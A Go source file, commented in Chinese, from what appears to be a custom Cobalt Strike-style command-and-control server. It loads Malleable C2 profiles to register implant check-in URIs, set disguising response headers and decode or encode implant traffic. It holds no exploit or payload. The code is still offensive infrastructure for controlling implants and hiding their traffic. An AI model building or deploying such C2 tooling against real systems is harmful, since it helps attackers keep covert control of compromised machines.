// csdev :: profile_bind.go  --  Malleable C2 profile 接入 listener
//
// 现状范围（诚实标注）:
//   [已实现] 从 profile 读取植入体入口 URI 池并按路径注册; 按 http-post/server
//            块设置应答头; 读取 sleeptime/jitter 用于日志提示。
//   [未实现] body 变换链 (base64/mask/netbios 等) —— 需要植入体侧同步实现,
//            见 docs/protocol_v2.md 第 5.2 节与 go/profile 包内的变换实现。
package main

import (
	"net/http"
	"sync"

	"csdev/profile"
)

var (
	gProfileMu   sync.RWMutex
	gProfile     *profile.Profile
	gProfilePath string
)

// loadProfileFile 加载并登记 profile。
func loadProfileFile(path string) error {
	p, err := profile.Load(path)
	if err != nil {
		return err
	}

	gProfileMu.Lock()
	gProfile = p
	gProfilePath = path
	gProfileMu.Unlock()

	logf("[*] 已加载 Malleable profile: %s", path)
	if p.SleepTime > 0 {
		logf("    sleeptime=%d ms   jitter=%d%%", p.SleepTime, p.Jitter)
	}
	if p.UserAgent != "" {
		logf("    useragent=%s", p.UserAgent)
	}
	if p.HTTPGet != nil && p.HTTPGet.Client != nil && len(p.HTTPGet.Client.URIs) > 0 {
		logf("    http-get  URI 池: %v", p.HTTPGet.Client.URIs)
	}
	if p.HTTPPost != nil && p.HTTPPost.Client != nil && len(p.HTTPPost.Client.URIs) > 0 {
		logf("    http-post URI 池: %v", p.HTTPPost.Client.URIs)
	}
	return nil
}

func profileGet() *profile.Profile {
	gProfileMu.RLock()
	defer gProfileMu.RUnlock()
	return gProfile
}

// profileURIs 返回需要注册为植入体入口的全部路径。
func profileURIs() []string {
	out := []string{"/submit"}
	p := profileGet()
	if p == nil {
		return out
	}
	add := func(b *profile.HTTPBlock) {
		if b == nil || b.Client == nil {
			return
		}
		for _, u := range b.Client.URIs {
			if u == "" {
				continue
			}
			dup := false
			for _, e := range out {
				if e == u {
					dup = true
				}
			}
			if !dup {
				out = append(out, u)
			}
		}
	}
	add(p.HTTPPost)
	add(p.HTTPGet)
	return out
}

// profileAcceptsPath 判断路径是否为植入体入口。
func profileAcceptsPath(path string) bool {
	for _, u := range profileURIs() {
		if u == path {
			return true
		}
	}
	return false
}

// profileApplyServerHeaders 按 http-post/server 块设置应答头。
func profileApplyServerHeaders(w http.ResponseWriter) {
	p := profileGet()
	if p == nil || p.HTTPPost == nil || p.HTTPPost.Server == nil {
		return
	}
	for k, v := range p.HTTPPost.Server.Headers {
		w.Header().Set(k, v)
	}
}

// ---------------------------------------------------------------- body 变换
//
// 语义 (与 CS 一致):
//   http-post/client/output 链 = 植入体上报数据时的变换 → 服务端收侧做逆变换
//   http-post/server/output 链 = 服务端下发数据时的变换 → 服务端发侧做正变换
//
// 植入体侧对应编译期宏 C2_XFORM (见 kits/beacon/xform.c)。两侧必须一致:
// 若 profile 声明 base64 而植入体按 raw 编译, 帧会解析失败 —— 这是设计上的
// 一致性要求, 不是缺陷。

func profileDecodeBody(b []byte) ([]byte, error) {
	p := profileGet()
	if p == nil || p.HTTPPost == nil || p.HTTPPost.Client == nil {
		return b, nil
	}
	out, err := p.HTTPPost.Client.RevertOutput(b)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func profileEncodeBody(b []byte) ([]byte, error) {
	p := profileGet()
	if p == nil || p.HTTPPost == nil || p.HTTPPost.Server == nil {
		return b, nil
	}
	out, err := p.HTTPPost.Server.ApplyOutput(b)
	if err != nil {
		return nil, err
	}
	return out, nil
}

// profileXformActive 用于日志/诊断: 当前是否配置了非恒等的内容变换
func profileXformActive() bool {
	p := profileGet()
	if p == nil || p.HTTPPost == nil {
		return false
	}
	return p.HTTPPost.Client != nil && len(p.HTTPPost.Client.Output) > 0 ||
		p.HTTPPost.Server != nil && len(p.HTTPPost.Server.Output) > 0
}

// profileSummary 供 /api/state 展示当前生效的 profile 概要。
func profileSummary() map[string]interface{} {
	p := profileGet()
	if p == nil {
		return map[string]interface{}{"loaded": false, "name": "default"}
	}
	uris := []string{}
	if p.HTTPPost != nil && p.HTTPPost.Client != nil {
		uris = p.HTTPPost.Client.URIs
	}
	return map[string]interface{}{
		"loaded":    true,
		"path":      gProfilePath,
		"uris":      uris,
		"useragent": p.UserAgent,
		"sleeptime": p.SleepTime,
		"jitter":    p.Jitter,
	}
}
